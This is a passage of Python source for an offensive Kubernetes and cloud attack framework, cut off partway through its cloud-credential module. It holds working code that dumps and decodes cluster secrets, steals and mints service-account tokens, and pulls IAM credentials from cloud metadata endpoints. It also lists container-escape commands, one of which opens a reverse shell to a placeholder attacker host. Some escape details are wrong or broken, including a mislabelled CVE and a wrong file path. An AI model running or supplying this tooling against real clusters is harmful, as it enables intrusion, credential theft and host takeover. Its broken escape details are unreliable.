#!/usr/bin/env python3
"""
Kraken Framework
=================
Author      : arkanzasfeziii
License     : MIT
Version     : 1.0.0
Description : Kubernetes & Cloud Native offensive suite for authorized red team engagements.
              Covers: K8s RBAC enumeration, secret dump, container escape, service account
              abuse, cloud credential bridging (EKS/AKS/GKE), etcd exploitation, and
              registry attacks.

              Aligned with MITRE ATT&CK:
                T1613 Container Discovery | T1552 Unsecured Credentials
                T1611 Escape to Host | T1078 Valid Accounts | T1190 Exploit Public App

WARNING: For AUTHORIZED penetration testing and red team engagements ONLY.
Unauthorized use is ILLEGAL. Obtain written authorization before use.
"""
from __future__ import annotations

import argparse
import base64
import json
import os
import re
import socket
import subprocess
import sys
import textwrap
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

try:
    from kubernetes import client as k8s_client, config as k8s_config
    from kubernetes.client.rest import ApiException
    K8S_SDK = True
except ImportError:
    K8S_SDK = False

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    REQUESTS = True
except ImportError:
    REQUESTS = False

try:
    import docker as docker_sdk
    DOCKER_SDK = True
except ImportError:
    DOCKER_SDK = False

try:
    import pyfiglet
    PYFIGLET = True
except ImportError:
    PYFIGLET = False


# ── Constants ──────────────────────────────────────────────────────────────────

TOOL_NAME = "Kraken Framework"
VERSION   = "1.0.0"
AUTHOR    = "arkanzasfeziii"
COMMAND   = "kraken"

LEGAL_WARNING = """
╔══════════════════════════════════════════════════════════════════════════════╗
║         ⚠   KRAKEN — AUTHORIZED RED TEAM USE ONLY   ⚠                      ║
╠══════════════════════════════════════════════════════════════════════════════╣
║  This framework executes REAL Kubernetes attacks: secret extraction,         ║
║  container escape, RBAC privilege escalation, cloud credential bridging,     ║
║  etcd dumping, and service account token abuse.                              ║
║                                                                              ║
║  Requirements before use:                                                   ║
║    ✓ Written authorization from the target organization                     ║
║    ✓ Defined scope (cluster / namespace)                                    ║
║    ✓ Rules of engagement signed off                                         ║
║                                                                              ║
║  The author (arkanzasfeziii) accepts NO LIABILITY for misuse.               ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

# K8s API paths
K8S_API_BASE = "https://{host}:{port}"
ETCD_PORT    = 2379
KUBELET_PORT = 10250

# Privilege escalation RBAC verbs
DANGEROUS_VERBS = {"*", "create", "update", "patch", "delete", "bind", "escalate", "impersonate"}
DANGEROUS_RESOURCES = {
    "*", "pods", "pods/exec", "pods/attach", "secrets", "configmaps",
    "serviceaccounts", "clusterroles", "clusterrolebindings",
    "roles", "rolebindings", "namespaces", "nodes",
}

# Cloud IMDS endpoints (accessible from within K8s pods)
CLOUD_IMDS: Dict[str, Dict[str, Any]] = {
    "aws_eks": {
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "indicator": ["iam", "ec2"],
        "follow_up": "http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
    },
    "azure_aks": {
        "url": ("http://169.254.169.254/metadata/identity/oauth2/token"
                "?api-version=2018-02-01&resource=https://management.azure.com/"),
        "headers": {"Metadata": "true"},
        "indicator": ["access_token"],
    },
    "gke_metadata": {
        "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "headers": {"Metadata-Flavor": "Google"},
        "indicator": ["access_token"],
    },
    "gke_project": {
        "url": "http://metadata.google.internal/computeMetadata/v1/project/project-id",
        "headers": {"Metadata-Flavor": "Google"},
        "indicator": [],
    },
}

# Secret patterns to hunt in K8s resources
SECRET_PATTERNS = [
    (r"AKIA[0-9A-Z]{16}", "AWS_ACCESS_KEY"),
    (r"(?i)password\s*[:=]\s*['\"]?([^\s'\"]{8,})", "PASSWORD"),
    (r"(?i)(api[_-]?key|apikey)\s*[:=]\s*['\"]?([a-zA-Z0-9\-_]{20,})", "API_KEY"),
    (r"-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----", "PRIVATE_KEY"),
    (r"ghp_[0-9a-zA-Z]{36}", "GITHUB_PAT"),
    (r"(?i)connectionstring\s*=\s*['\"]([^'\"]+)['\"]", "CONNECTION_STRING"),
    (r"(?i)(secret|token)\s*[:=]\s*['\"]([^\s'\"]{16,})['\"]", "SECRET_TOKEN"),
]

# Container escape techniques
ESCAPE_TECHNIQUES = [
    {
        "name": "privileged_container",
        "check": "cat /proc/1/status | grep CapEff",
        "indicator": "CapEff:\t0000003fffffffff",
        "escape": "nsenter -t 1 -m -u -i -n -p -- bash",
        "description": "Running in privileged container. nsenter to escape to host.",
    },
    {
        "name": "docker_socket",
        "check": "ls /var/run/docker.sock",
        "indicator": "/var/run/docker.sock",
        "escape": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
        "description": "Docker socket mounted. Create privileged container for host access.",
    },
    {
        "name": "hostpath_root",
        "check": "ls /host",
        "indicator": "etc",
        "escape": "chroot /host /bin/bash",
        "description": "Host / mounted at /host. chroot to escape.",
    },
    {
        "name": "hostpid",
        "check": "cat /proc/1/cmdline",
        "indicator": "systemd",
        "escape": "nsenter -t 1 -m -u -i -n -p -- bash",
        "description": "hostPID=true. Can nsenter into PID 1 (host init).",
    },
    {
        "name": "cgroup_v1",
        "check": "cat /proc/1/cgroup",
        "indicator": "/",
        "escape": "mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && echo \"$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /proc/mounts | head -1)/../../../bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1\" > /path_release && echo 1 > /tmp/cgrp/x/cgroup.procs",
        "description": "cgroup v1 release_agent escape (Dirty COW variant).",
    },
]

RBAC_PRIVESC_PATHS = [
    ("pods/exec",    "exec",   "Exec into any pod — lateral movement / code execution"),
    ("pods",         "create", "Create pods with privileged specs or hostPath mounts"),
    ("secrets",      "get",    "Read all secrets including service account tokens"),
    ("clusterroles", "bind",   "Bind ClusterRoleBinding → escalate to cluster-admin"),
    ("serviceaccounts","impersonate","Impersonate any SA → assume its RBAC permissions"),
    ("nodes",        "create", "Create node objects → join fake node, get secrets"),
    ("pods",         "patch",  "Patch running pod to add volume mounts or env vars"),
]


# ── Dataclasses ────────────────────────────────────────────────────────────────

@dataclass
class AttackResult:
    module:   str
    action:   str
    status:   str
    target:   str = ""
    data:     Any = None
    severity: str = "INFO"
    notes:    str = ""

@dataclass
class Credential:
    type:   str
    value:  Dict[str, str]
    source: str
    notes:  str = ""

@dataclass
class EngagementContext:
    api_host:    str = ""
    api_port:    int = 6443
    token:       str = ""
    kubeconfig:  str = ""
    namespace:   str = "default"
    results:     List[AttackResult] = field(default_factory=list)
    credentials: List[Credential]   = field(default_factory=list)
    loot:        Dict[str, Any]      = field(default_factory=dict)
    k8s_core:    Any = None
    k8s_rbac:    Any = None
    k8s_apps:    Any = None
    k8s_batch:   Any = None
    delay:       float = 0.2


# ── Helpers ───────────────────────────────────────────────────────────────────

def _log(msg: str, level: str = "INFO") -> None:
    colors = {"INFO":"\033[36m","OK":"\033[32m","WARN":"\033[33m",
              "ERR":"\033[31m","CRIT":"\033[35m"}
    reset = "\033[0m"
    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
    print(f"{colors.get(level,'')}{ts} [{level}] {msg}{reset}")

def _b64d(s: str) -> str:
    try:
        return base64.b64decode(s).decode("utf-8", errors="replace")
    except Exception:
        return s

def _scan_for_secrets(text: str) -> List[Dict[str, str]]:
    found = []
    for pattern, label in SECRET_PATTERNS:
        for m in re.finditer(pattern, text, re.MULTILINE):
            val = m.group(0) if not m.groups() else m.group(1)
            found.append({"type": label, "value": val[:200]})
    return found

def _k8s_connect(ctx: EngagementContext) -> bool:
    if not K8S_SDK:
        _log("Install kubernetes: pip install kubernetes", "ERR")
        return False
    try:
        if ctx.kubeconfig:
            k8s_config.load_kube_config(config_file=ctx.kubeconfig)
        elif ctx.token:
            config = k8s_client.Configuration()
            config.host = f"https://{ctx.api_host}:{ctx.api_port}"
            config.verify_ssl = False
            config.api_key = {"authorization": f"Bearer {ctx.token}"}
            k8s_client.Configuration.set_default(config)
        else:
            # Try in-cluster config (running inside a pod)
            try:
                k8s_config.load_incluster_config()
                _log("[K8s] Using in-cluster config (running inside pod)", "INFO")
            except Exception:
                k8s_config.load_kube_config()

        ctx.k8s_core  = k8s_client.CoreV1Api()
        ctx.k8s_rbac  = k8s_client.RbacAuthorizationV1Api()
        ctx.k8s_apps  = k8s_client.AppsV1Api()
        ctx.k8s_batch = k8s_client.BatchV1Api()
        # Verify
        ctx.k8s_core.list_namespace()
        _log(f"Connected to Kubernetes cluster", "OK")
        return True
    except Exception as exc:
        _log(f"K8s connect failed: {exc}", "ERR")
        return False

def _k8s_api_raw(ctx: EngagementContext, path: str,
                  method: str = "GET", body: Any = None) -> Optional[Dict]:
    if not REQUESTS:
        return None
    url = f"https://{ctx.api_host}:{ctx.api_port}{path}"
    hdrs = {"Authorization": f"Bearer {ctx.token}",
            "Content-Type": "application/json"}
    try:
        resp = requests.request(method, url, headers=hdrs, json=body,
                                verify=False, timeout=10)
        return resp.json() if resp.text else {}
    except Exception:
        return None


# ── Module 1: Enumeration ─────────────────────────────────────────────────────

class EnumModule:
    """Enumerate namespaces, pods, services, RBAC, and identify attack surface."""

    def run(self, ctx: EngagementContext) -> List[AttackResult]:
        if not _k8s_connect(ctx):
            return [AttackResult("enum", "connect", "FAILED",
                                 notes="Cannot connect. Check --token, --kubeconfig, or in-cluster")]
        results = []
        results.extend(self._enum_cluster_info(ctx))
        results.extend(self._enum_namespaces(ctx))
        results.extend(self._enum_pods(ctx))
        results.extend(self._enum_services(ctx))
        results.extend(self._enum_rbac(ctx))
        results.extend(self._find_privileged_pods(ctx))
        results.extend(self._enum_service_accounts(ctx))
        return results

    def _enum_cluster_info(self, ctx: EngagementContext) -> List[AttackResult]:
        try:
            version_api = k8s_client.VersionApi()
            ver = version_api.get_code()
            info = {"version": ver.git_version, "platform": ver.platform}
            ctx.loot["cluster_version"] = info
            _log(f"[Enum] Cluster version: {ver.git_version} | Platform: {ver.platform}", "INFO")
            return [AttackResult("enum", "cluster_info", "INFO", data=info,
                                 notes=f"K8s {ver.git_version} on {ver.platform}")]
        except Exception as exc:
            return [AttackResult("enum", "cluster_info", "FAILED", notes=str(exc))]

    def _enum_namespaces(self, ctx: EngagementContext) -> List[AttackResult]:
        try:
            ns_list = ctx.k8s_core.list_namespace()
            namespaces = [ns.metadata.name for ns in ns_list.items]
            ctx.loot["namespaces"] = namespaces
            _log(f"[Enum] Namespaces: {namespaces}", "INFO")
            sensitive = [n for n in namespaces if any(
                kw in n.lower() for kw in ["prod","production","payment","finance","secret","cred"])]
            if sensitive:
                _log(f"[Enum] Sensitive namespaces: {sensitive}", "WARN")
            return [AttackResult("enum", "namespaces", "INFO",
                                 data={"count": len(namespaces), "namespaces": namespaces,
                                       "sensitive": sensitive},
                                 severity="HIGH" if sensitive else "INFO",
                                 notes=f"{len(namespaces)} namespaces. Sensitive: {sensitive}")]
        except ApiException as exc:
            return [AttackResult("enum", "namespaces", "FAILED", notes=str(exc))]

    def _enum_pods(self, ctx: EngagementContext) -> List[AttackResult]:
        try:
            pods_all = ctx.k8s_core.list_pod_for_all_namespaces()
            pods = []
            for pod in pods_all.items:
                pod_info = {
                    "name": pod.metadata.name,
                    "namespace": pod.metadata.namespace,
                    "node": pod.spec.node_name,
                    "status": pod.status.phase,
                    "containers": [c.name for c in (pod.spec.containers or [])],
                    "images": [c.image for c in (pod.spec.containers or [])],
                    "host_pid": pod.spec.host_pid or False,
                    "host_network": pod.spec.host_network or False,
                    "service_account": pod.spec.service_account_name,
                }
                pods.append(pod_info)
            ctx.loot["pods"] = pods
            _log(f"[Enum] {len(pods)} pods across all namespaces", "INFO")
            return [AttackResult("enum", "pods", "INFO",
                                 data={"count": len(pods), "pods": pods[:20]},
                                 notes=f"{len(pods)} pods enumerated")]
        except ApiException as exc:
            return [AttackResult("enum", "pods", "FAILED", notes=str(exc))]

    def _enum_services(self, ctx: EngagementContext) -> List[AttackResult]:
        try:
            svc_all = ctx.k8s_core.list_service_for_all_namespaces()
            services = []
            exposed = []
            for svc in svc_all.items:
                svc_info = {
                    "name": svc.metadata.name,
                    "namespace": svc.metadata.namespace,
                    "type": svc.spec.type,
                    "cluster_ip": svc.spec.cluster_ip,
                    "ports": [(p.port, p.protocol) for p in (svc.spec.ports or [])],
                    "external_ip": [str(i.ip) for i in (svc.status.load_balancer.ingress or [])]
                    if svc.status.load_balancer and svc.status.load_balancer.ingress else [],
                }
                services.append(svc_info)
                if svc.spec.type in ("LoadBalancer", "NodePort"):
                    exposed.append(svc_info)
            ctx.loot["services"] = services
            if exposed:
                _log(f"[Enum] Externally exposed services: {[s['name'] for s in exposed]}", "WARN")
            return [AttackResult("enum", "services", "INFO",
                                 data={"count": len(services), "exposed": exposed},
                                 severity="MEDIUM" if exposed else "INFO",
                                 notes=f"{len(services)} services, {len(exposed)} externally exposed")]
        except ApiException as exc:
            return [AttackResult("enum", "services", "FAILED", notes=str(exc))]

    def _enum_rbac(self, ctx: EngagementContext) -> List[AttackResult]:
        results = []
        priv_bindings = []
        wildcard_roles = []
        try:
            crbs = ctx.k8s_rbac.list_cluster_role_binding()
            for crb in crbs.items:
                role_name = crb.role_ref.name
                subjects  = crb.subjects or []
                for subj in subjects:
                    if subj.kind in ("ServiceAccount", "User", "Group"):
                        # Check if cluster-admin or wildcard
                        if role_name == "cluster-admin":
                            priv_bindings.append({
                                "binding": crb.metadata.name,
                                "role": role_name,
                                "subject": f"{subj.kind}/{subj.name}",
                                "namespace": getattr(subj, "namespace", ""),
                            })
                            _log(f"[Enum/RBAC] cluster-admin: {subj.kind}/{subj.name}", "CRIT")
            # Check cluster roles for wildcards
            crs = ctx.k8s_rbac.list_cluster_role()
            for cr in crs.items:
                for rule in (cr.rules or []):
                    verbs = set(rule.verbs or [])
                    resources = set(rule.resources or [])
                    if "*" in verbs and "*" in resources:
                        wildcard_roles.append({"role": cr.metadata.name,
                                               "verbs": list(verbs),
                                               "resources": list(resources)})

            ctx.loot["rbac"] = {"cluster_admin_bindings": priv_bindings,
                                 "wildcard_roles": wildcard_roles}
            results.append(AttackResult(
                "enum", "rbac", "SUCCESS" if priv_bindings else "INFO",
                severity="CRITICAL" if priv_bindings else "INFO",
                data={"cluster_admin_subjects": len(priv_bindings),
                      "wildcard_roles": len(wildcard_roles)},
                notes=f"{len(priv_bindings)} cluster-admin bindings, {len(wildcard_roles)} wildcard roles",
            ))

            # Check dangerous permissions for current SA
            results.extend(self._check_own_perms(ctx))
        except ApiException as exc:
            results.append(AttackResult("enum", "rbac", "FAILED", notes=str(exc)))
        return results

    def _check_own_perms(self, ctx: EngagementContext) -> List[AttackResult]:
        """Check if current SA/user has dangerous permissions."""
        dangerous = []
        auth_api = k8s_client.AuthorizationV1Api()
        for resource, verb, desc in RBAC_PRIVESC_PATHS:
            try:
                body = k8s_client.V1SelfSubjectAccessReview(
                    spec=k8s_client.V1SelfSubjectAccessReviewSpec(
                        resource_attributes=k8s_client.V1ResourceAttributes(
                            verb=verb, resource=resource, namespace="default"
                        )
                    )
                )
                resp = auth_api.create_self_subject_access_review(body)
                if resp.status.allowed:
                    dangerous.append({"resource": resource, "verb": verb, "desc": desc})
                    _log(f"[Enum/RBAC] CAN {verb} {resource}: {desc}", "CRIT")
            except Exception:
                pass
        if dangerous:
            ctx.loot["own_dangerous_perms"] = dangerous
            return [AttackResult("enum", "own_permissions", "SUCCESS",
                                 severity="CRITICAL",
                                 data=dangerous,
                                 notes=f"Current identity has {len(dangerous)} dangerous permissions!")]
        return [AttackResult("enum", "own_permissions", "INFO",
                             notes="No obvious dangerous RBAC permissions for current identity")]

    def _find_privileged_pods(self, ctx: EngagementContext) -> List[AttackResult]:
        privileged_pods = []
        for pod_info in ctx.loot.get("pods", []):
            if pod_info.get("host_pid") or pod_info.get("host_network"):
                privileged_pods.append(pod_info)
                _log(f"[Enum] Privileged pod: {pod_info['name']} in {pod_info['namespace']}", "WARN")
        # Also check spec for security context
        try:
            pods_all = ctx.k8s_core.list_pod_for_all_namespaces()
            for pod in pods_all.items:
                for c in (pod.spec.containers or []):
                    sc = c.security_context
                    if sc and (sc.privileged or sc.run_as_user == 0 or sc.allow_privilege_escalation):
                        privileged_pods.append({
                            "name": pod.metadata.name,
                            "namespace": pod.metadata.namespace,
                            "container": c.name,
                            "privileged": sc.privileged,
                            "run_as_root": sc.run_as_user == 0,
                        })
                        _log(f"[Enum] Privileged container: {pod.metadata.namespace}/{pod.metadata.name}/{c.name}", "CRIT")
        except Exception:
            pass
        ctx.loot["privileged_pods"] = privileged_pods
        return [AttackResult("enum", "privileged_pods",
                             "SUCCESS" if privileged_pods else "INFO",
                             severity="CRITICAL" if privileged_pods else "INFO",
                             data=privileged_pods,
                             notes=f"{len(privileged_pods)} privileged pods/containers — escape candidates")]

    def _enum_service_accounts(self, ctx: EngagementContext) -> List[AttackResult]:
        sa_tokens = []
        try:
            for ns in ctx.loot.get("namespaces", ["default"]):
                sas = ctx.k8s_core.list_namespaced_service_account(namespace=ns)
                for sa in sas.items:
                    sa_tokens.append({
                        "name": sa.metadata.name,
                        "namespace": ns,
                        "secrets": [s.name for s in (sa.secrets or [])],
                    })
        except Exception:
            pass
        ctx.loot["service_accounts"] = sa_tokens
        return [AttackResult("enum", "service_accounts", "INFO",
                             data={"count": len(sa_tokens)},
                             notes=f"{len(sa_tokens)} service accounts enumerated")]


# ── Module 2: Secret Dump ─────────────────────────────────────────────────────

class SecretDumpModule:
    """Extract and decode ALL Kubernetes secrets and sensitive ConfigMaps."""

    def run(self, ctx: EngagementContext,
            namespace: str = "") -> List[AttackResult]:
        if not ctx.k8s_core and not _k8s_connect(ctx):
            return [AttackResult("secret-dump", "connect", "FAILED")]
        results = []
        namespaces = ([namespace] if namespace else
                      ctx.loot.get("namespaces", ["default"]))

        all_secrets = []
        for ns in namespaces:
            try:
                secrets = ctx.k8s_core.list_namespaced_secret(namespace=ns)
                for secret in secrets.items:
                    if not secret.data:
                        continue
                    decoded = {}
                    for k, v in secret.data.items():
                        decoded[k] = _b64d(v) if v else ""
                    secret_info = {
                        "name":      secret.metadata.name,
                        "namespace": ns,
                        "type":      secret.type,
                        "keys":      list(decoded.keys()),
                        "data":      {k: v[:200] for k, v in decoded.items()},
                    }
                    all_secrets.append(secret_info)

                    # Scan decoded values for sensitive patterns
                    for k, v in decoded.items():
                        hits = _scan_for_secrets(v)
                        for hit in hits:
                            _log(f"[SecretDump] {ns}/{secret.metadata.name}.{k}: {hit['type']}", "CRIT")
                            ctx.credentials.append(Credential(
                                hit["type"],
                                {"namespace": ns, "secret": secret.metadata.name,
                                 "key": k, "value": hit["value"]},
                                f"k8s:secret:{ns}/{secret.metadata.name}",
                            ))

                    # Always store service-account tokens
                    if "token" in decoded:
                        token = decoded["token"]
                        _log(f"[SecretDump] SA token: {ns}/{secret.metadata.name} | {token[:20]}...", "WARN")
                        ctx.credentials.append(Credential(
                            "k8s_sa_token",
                            {"token": token, "namespace": ns},
                            f"k8s:secret:{ns}/{secret.metadata.name}",
                            "Service account token — can be used for kubectl/API auth",
                        ))
            except ApiException as e:
                if e.status == 403:
                    _log(f"[SecretDump] Forbidden: {ns}", "WARN")
                else:
                    _log(f"[SecretDump] {ns}: {e}", "WARN")

        ctx.loot["secrets"] = all_secrets

        # Also scan ConfigMaps for secrets
        configmap_hits = self._scan_configmaps(ctx, namespaces)

        results.append(AttackResult(
            "secret-dump", "k8s_secrets", "SUCCESS" if all_secrets else "PARTIAL",
            severity="CRITICAL" if ctx.credentials else "HIGH",
            data={"total_secrets": len(all_secrets),
                  "credentials_found": len(ctx.credentials)},
            notes=f"Extracted {len(all_secrets)} secrets, {len(ctx.credentials)} credentials found",
        ))
        return results

    def _scan_configmaps(self, ctx: EngagementContext,
                          namespaces: List[str]) -> List[Dict]:
        hits = []
        for ns in namespaces:
            try:
                cms = ctx.k8s_core.list_namespaced_config_map(namespace=ns)
                for cm in cms.items:
                    for k, v in (cm.data or {}).items():
                        found = _scan_for_secrets(str(v))
                        if found:
                            hits.append({"namespace": ns, "configmap": cm.metadata.name,
                                         "key": k, "findings": found})
                            _log(f"[SecretDump] ConfigMap secret: {ns}/{cm.metadata.name}.{k}: {found[0]['type']}", "CRIT")
            except Exception:
                pass
        if hits:
            ctx.loot["configmap_secrets"] = hits
        return hits


# ── Module 3: Container Escape ────────────────────────────────────────────────

class EscapeModule:
    """Identify and execute container escape techniques."""

    def run(self, ctx: EngagementContext) -> List[AttackResult]:
        results = []
        _log("[Escape] Checking container escape vectors...", "INFO")

        for tech in ESCAPE_TECHNIQUES:
            result = self._check_technique(tech)
            results.append(result)

        # Check for writable cgroup v1 release_agent
        results.extend(self._check_cgroup_escape())
        # Check capabilities
        results.extend(self._check_capabilities())
        return results

    def _check_technique(self, tech: Dict[str, Any]) -> AttackResult:
        name = tech["name"]
        try:
            proc = subprocess.run(
                tech["check"], shell=True, capture_output=True, text=True, timeout=5
            )
            output = proc.stdout + proc.stderr
            if tech["indicator"] in output:
                _log(f"[Escape] VULNERABLE: {name} — {tech['description']}", "CRIT")
                return AttackResult(
                    "escape", name, "SUCCESS",
                    severity="CRITICAL",
                    data={"check_output": output[:200], "escape_cmd": tech["escape"]},
                    notes=f"{tech['description']} | Escape: {tech['escape'][:100]}",
                )
            else:
                return AttackResult("escape", name, "INFO",
                                    notes=f"{name}: not applicable")
        except Exception as exc:
            return AttackResult("escape", name, "FAILED", notes=str(exc))

    def _check_capabilities(self) -> List[AttackResult]:
        results = []
        try:
            proc = subprocess.run(
                "cat /proc/self/status | grep Cap",
                shell=True, capture_output=True, text=True, timeout=3
            )
            cap_eff_match = re.search(r"CapEff:\s+([0-9a-f]+)", proc.stdout)
            if cap_eff_match:
                cap_hex = int(cap_eff_match.group(1), 16)
                # Check for dangerous capabilities
                CAP_SYS_ADMIN   = (1 << 21)
                CAP_SYS_PTRACE  = (1 << 19)
                CAP_NET_ADMIN   = (1 << 12)
                CAP_DAC_OVERRIDE = (1 << 1)

                dangerous_caps = []
                if cap_hex & CAP_SYS_ADMIN:
                    dangerous_caps.append("CAP_SYS_ADMIN (mount, device access, many escapes)")
                if cap_hex & CAP_SYS_PTRACE:
                    dangerous_caps.append("CAP_SYS_PTRACE (ptrace any process → code injection)")
                if cap_hex & CAP_NET_ADMIN:
                    dangerous_caps.append("CAP_NET_ADMIN (iptables manipulation, traffic capture)")

                if dangerous_caps:
                    _log(f"[Escape] Dangerous capabilities: {dangerous_caps}", "CRIT")
                    results.append(AttackResult(
                        "escape", "capabilities", "SUCCESS",
                        severity="CRITICAL",
                        data={"cap_hex": hex(cap_hex), "dangerous": dangerous_caps},
                        notes=f"Dangerous capabilities present: {', '.join(dangerous_caps)}",
                    ))
                else:
                    results.append(AttackResult("escape", "capabilities", "INFO",
                                                data={"cap_hex": hex(cap_hex)},
                                                notes="No dangerous capabilities detected"))
        except Exception as exc:
            results.append(AttackResult("escape", "capabilities", "FAILED", notes=str(exc)))
        return results

    def _check_cgroup_escape(self) -> List[AttackResult]:
        try:
            # Check if cgroup v1 release_agent is writable (CVE-2022-0492 style)
            result = subprocess.run(
                "find /sys/fs/cgroup -name release_agent -writable 2>/dev/null",
                shell=True, capture_output=True, text=True, timeout=5
            )
            if result.stdout.strip():
                _log(f"[Escape] Writable cgroup release_agent found!", "CRIT")
                return [AttackResult(
                    "escape", "cgroup_release_agent", "SUCCESS",
                    severity="CRITICAL",
                    data={"writable_paths": result.stdout.strip().split("\n")},
                    notes="Writable cgroup release_agent — container escape via CVE-2022-0492 style. "
                          "Write reverse shell payload to release_agent file.",
                )]
        except Exception:
            pass
        return []


# ── Module 4: Service Account Abuse ──────────────────────────────────────────

class SAAbuseModule:
    """Steal SA tokens, escalate via RBAC, impersonate high-privilege SAs."""

    def run(self, ctx: EngagementContext,
            target_sa: str = "") -> List[AttackResult]:
        if not ctx.k8s_core and not _k8s_connect(ctx):
            return [AttackResult("sa-abuse", "connect", "FAILED")]
        results = []

        # 1. Read own mounted token
        results.extend(self._read_own_token(ctx))
        # 2. List and steal other SA tokens
        results.extend(self._steal_sa_tokens(ctx, target_sa))
        # 3. Check for token-generating permission
        results.extend(self._create_sa_token(ctx, target_sa))
        return results

    def _read_own_token(self, ctx: EngagementContext) -> List[AttackResult]:
        token_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
        ns_path    = "/var/run/secrets/kubernetes.io/serviceaccount/namespace"
        if Path(token_path).exists():
            token = Path(token_path).read_text().strip()
            ns    = Path(ns_path).read_text().strip() if Path(ns_path).exists() else "unknown"
            _log(f"[SA] Own mounted token found (NS: {ns}): {token[:30]}...", "INFO")
            ctx.credentials.append(Credential(
                "k8s_mounted_token",
                {"token": token, "namespace": ns},
                "filesystem:/var/run/secrets/kubernetes.io/serviceaccount/token",
                "Mounted SA token. Use: kubectl --token=TOKEN ...",
            ))
            return [AttackResult("sa-abuse", "mounted_token", "SUCCESS",
                                 severity="INFO",
                                 data={"namespace": ns, "token": token[:40] + "..."},
                                 notes=f"Mounted SA token in namespace '{ns}'")]
        return []

    def _steal_sa_tokens(self, ctx: EngagementContext,
                          target_sa: str) -> List[AttackResult]:
        results = []
        stolen = []
        namespaces = ctx.loot.get("namespaces", ["default", "kube-system"])

        for ns in namespaces:
            try:
                secrets = ctx.k8s_core.list_namespaced_secret(namespace=ns)
                for secret in secrets.items:
                    if secret.type != "kubernetes.io/service-account-token":
                        continue
                    sa_name = (secret.metadata.annotations or {}).get(
                        "kubernetes.io/service-account.name", "")
                    if target_sa and sa_name != target_sa:
                        continue
                    if secret.data and "token" in secret.data:
                        token = _b64d(secret.data["token"])
                        # Check if this SA has interesting bindings
                        is_admin = self._check_sa_bindings(ctx, sa_name, ns)
                        stolen.append({
                            "sa": sa_name, "namespace": ns,
                            "secret": secret.metadata.name,
                            "token": token[:60] + "...", "full_token": token,
                            "is_admin": is_admin,
                        })
                        if is_admin:
                            _log(f"[SA] HIGH-VALUE TOKEN: {ns}/{sa_name} (has admin binding!)", "CRIT")
                        ctx.credentials.append(Credential(
                            "k8s_sa_token",
                            {"token": token, "namespace": ns, "sa": sa_name},
                            f"k8s:secret:{ns}/{secret.metadata.name}",
                            f"SA token for {sa_name} in {ns}" + (" [ADMIN]" if is_admin else ""),
                        ))
            except ApiException:
                pass

        if stolen:
            ctx.loot["stolen_tokens"] = stolen
            admin_tokens = [t for t in stolen if t["is_admin"]]
            results.append(AttackResult(
                "sa-abuse", "token_theft", "SUCCESS",
                severity="CRITICAL" if admin_tokens else "HIGH",
                data={"total": len(stolen), "admin_tokens": len(admin_tokens)},
                notes=f"Stole {len(stolen)} SA tokens ({len(admin_tokens)} with admin bindings). "
                      f"Use: kubectl --token=TOKEN get pods",
            ))
        return results

    def _check_sa_bindings(self, ctx: EngagementContext,
                            sa: str, ns: str) -> bool:
        try:
            crbs = ctx.k8s_rbac.list_cluster_role_binding()
            for crb in crbs.items:
                for subj in (crb.subjects or []):
                    if (subj.kind == "ServiceAccount" and
                            subj.name == sa and
                            getattr(subj, "namespace", "") == ns):
                        if crb.role_ref.name == "cluster-admin":
                            return True
        except Exception:
            pass
        return False

    def _create_sa_token(self, ctx: EngagementContext,
                          target_sa: str) -> List[AttackResult]:
        if not target_sa:
            return []
        try:
            # Try to create a token for target SA (requires serviceaccounts/token permission)
            token_req = {
                "apiVersion": "authentication.k8s.io/v1",
                "kind": "TokenRequest",
                "spec": {"expirationSeconds": 86400},
            }
            ns = ctx.namespace
            resp = _k8s_api_raw(
                ctx,
                f"/api/v1/namespaces/{ns}/serviceaccounts/{target_sa}/token",
                method="POST", body=token_req
            )
            if resp and "status" in resp and "token" in resp.get("status", {}):
                token = resp["status"]["token"]
                _log(f"[SA] Created token for SA '{target_sa}': {token[:30]}...", "CRIT")
                ctx.credentials.append(Credential(
                    "k8s_created_token",
                    {"token": token, "sa": target_sa, "namespace": ns},
                    f"k8s:TokenRequest:{ns}/{target_sa}",
                    f"Token created for {target_sa} via serviceaccounts/token",
                ))
                return [AttackResult("sa-abuse", "token_create", "SUCCESS",
                                     severity="CRITICAL",
                                     data={"sa": target_sa, "token": token[:60] + "..."},
                                     notes=f"Token for SA '{target_sa}' created. 24h validity.")]
        except Exception:
            pass
        return []


# ── Module 5: Cloud Bridge ────────────────────────────────────────────────────

class CloudBridgeModule:
    """Extract cloud provider credentials via IMDS from within K8s pods."""

    def run(self, ctx: EngagementContext) -> List[AttackResult]:
        results = []
        if not REQUESTS:
            return [AttackResult("cloud-bridge", "setup", "FAILED",
                                 notes="Install requests: pip install requests")]

        for cloud_name, endpoint in CLOUD_IMDS.items():
            result = self._probe_imds(ctx, cloud_name, endpoint)
            if result:
                results.append(result)

        if not results:
            results.append(AttackResult("cloud-bridge", "imds_scan", "INFO",
                                        notes="No cloud metadata endpoints accessible from this context"))
        return results

    def _probe_imds(self, ctx: EngagementContext,
                    cloud_name: str, endpoint: Dict) -> Optional[AttackResult]:
        url     = endpoint["url"]
        hdrs    = endpoint.get("headers", {})
        indicators = endpoint.get("indicator", [])
        try:
            resp = requests.get(url, headers=hdrs, timeout=3, verify=False)
            body = resp.text
            if resp.status_code != 200:
                return None
            if indicators and not any(i.lower() in body.lower() for i in indicators):
                return None

            _log(f"[CloudBridge] IMDS accessible: {cloud_name} at {url}", "CRIT")

            # Extract credentials based on cloud type
            if cloud_name == "aws_eks":
                # Get role name, then request credentials
                role_name = body.strip().split("\n")[0].strip()
                cred_url = endpoint["follow_up"].format(role=role_name)
                cred_resp = requests.get(cred_url, timeout=3)
